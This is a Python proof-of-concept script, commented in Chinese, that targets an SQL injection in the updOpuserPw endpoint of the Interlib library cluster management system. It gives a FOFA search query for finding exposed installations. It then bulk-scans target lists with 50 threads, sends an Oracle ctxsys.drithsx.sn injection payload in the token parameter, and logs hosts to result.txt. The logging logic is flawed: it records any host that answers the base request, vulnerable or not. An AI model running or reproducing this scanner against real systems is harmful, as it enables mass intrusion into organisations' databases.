# 图书馆集群管理系统interlib updOpuserPw SQL注入漏洞
import argparse, requests, sys, time, re
from termcolor import colored
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


# fofa语句
# body="interlib"

def banner():
    test = """
████████╗███████╗ ██████╗      ██╗ ██████╗       ███████╗ ██████╗ ██╗     
╚══██╔══╝██╔════╝██╔════╝      ██║██╔═══██╗      ██╔════╝██╔═══██╗██║     
   ██║   ███████╗██║  ███╗     ██║██║   ██║█████╗███████╗██║   ██║██║     
   ██║   ╚════██║██║   ██║██   ██║██║▄▄ ██║╚════╝╚════██║██║▄▄ ██║██║     
   ██║   ███████║╚██████╔╝╚█████╔╝╚██████╔╝      ███████║╚██████╔╝███████╗
   ╚═╝   ╚══════╝ ╚═════╝  ╚════╝  ╚══▀▀═╝       ╚══════╝ ╚══▀▀═╝ ╚══════╝

                                   
"""
    colored_color = colored(test, 'blue')
    print(colored_color)


def main():
    banner()
    parser = argparse.ArgumentParser(description='图书馆集群管理系统interlib updOpuserPw SQL注入漏洞POC')
    parser.add_argument('-u', '--url', dest='url', type=str, help="请输入你要测试的URL")
    parser.add_argument('-f', '--file', dest='file', type=str, help="请输入你要批量测试的文件路径")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    api_payload = "/interlib3/service/sysop/updOpuserPw?loginid=test&newpassword=12356&token=1%27and+ctxsys.drithsx.sn(1,(select%20MOD(9,9)%20from%20dual))=%272"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
    }
    try:
        res = requests.get(url=target, verify=False)
        res1 = requests.get(url=target + api_payload, headers=headers, verify=False)
        if res.status_code == 200:
            if res1.status_code == 200 and "message" in res1.text:
                print(f"[+]{target} 存在sql注入漏洞")
            with open('result.txt', 'a') as fp:
                fp.write(target + '\n')
        else:
            print(f"[-]{target} 不存在sql注入漏洞")
    except:
        print(f"[X]{target} 该站点无法访问")


if __name__ == '__main__':
    main()